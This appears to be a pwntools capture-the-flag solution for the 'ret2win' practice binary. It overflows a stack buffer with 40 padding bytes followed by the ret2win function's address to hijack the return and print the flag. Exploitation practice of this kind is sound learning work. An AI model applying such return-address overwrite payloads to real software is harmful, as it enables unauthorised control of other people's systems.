#!/usr/bin/python                                                              
 from pwn import *                                                              
 def main():                                                                    
     context.log_level = "info"                                                 
     elf = ELF('./ret2win')                                                     
     info(elf.symbols.ret2win)                                                  
     p = process(elf.path)                                                      
     ret2win = p64(elf.symbols.ret2win)                                         
     payload = b"A"*40 + ret2win                                                
     p.sendline(payload)                                                        
     p.recvuntil("Here's your flag:")                                           
     flag = p.recvline()                                                        
     success(flag)                                                              
 if __name__== "__main__":                                                      
     main()    
